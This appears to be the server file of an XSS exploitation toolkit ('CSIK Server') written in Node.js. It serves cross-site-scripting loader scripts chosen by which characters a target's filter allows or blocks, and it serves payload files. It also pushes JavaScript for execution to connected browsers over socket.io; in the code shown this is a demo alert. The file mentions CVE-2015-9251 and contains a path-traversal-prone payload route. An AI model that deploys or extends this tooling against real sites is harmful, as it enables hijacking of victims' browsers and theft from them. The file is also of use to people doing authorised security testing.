import express from 'express'
import http from 'http'
import socketio from 'socket.io'
import { resolve } from 'path'
import ld from 'lodash'
import cors from 'cors'
import listDir from './lib/listDir.js'

const app = express()
const server = http.createServer(app)
const io = socketio(server)
const port = 3000

let loaders = () => { console.log('Not ready') }

loadLoaders().then((loaderGetter) => {
  loaders = loaderGetter
})

const payloadUrl = 'http://localhost:3000/payload/socketControl'

app.use(cors())

app.get('/loaders', (req, res) => {
  return res.json(loaders.list())
})

app.get('/loaders/without/:filter', (req, res) => {
  const blacklist = req.params.filter
  return res.json(loaders.list().reduce((loaderList, key) => {
    if (loaders.get(key).charset.allowedByBlacklist(blacklist))
      loaderList.push(key) 
    return loaderList
  }, []))
})

app.get('/loaders/madeof/:filter', (req, res) => {
  const whitelist = req.params.filter
  return res.json(loaders.list().reduce((loaderList, key) => {
    if (loaders.get(key).charset.allowedByWhiteList(whitelist))
      loaderList.push(key)
    return loaderList
  }, []))
})

app.get('/loader/:loader', (req, res) => {
    // May need to be text/javascript for CVE-2015-9251
    res.set('Content-Type', 'application/javascript')
    return res.send(
      loaders.get(req.params.loader).script({ PAYLOAD_URL: payloadUrl })
    )
})

app.get('/payload/:payload', (req, res) => {
  res.sendFile(resolve('./payloads/' + req.params.payload + '.js'))
})

io.on('connection', (socket) => {
  console.log('Connection received')
  socket.emit('run', 'alert("xss")')
})

server.listen(port, () => console.log(`CSIK Server listening on port ${port}!`))

async function loadLoaders() {
  let loaders = await listDir(resolve('./loaders/'))
  let loaderMap = {}
  while(loaders.length > 0) {
    let loader = loaders.shift()
    ld.set(loaderMap, ld.trimEnd(loader, '.js'), await import(`./loaders/${loader}`))
  }
  return {
      get: (key) => {
      return loaderMap[key] ? loaderMap[key].default : 'Not a loader'
      },
      list: () => {
        return Object.keys(loaderMap)
      }
  }
}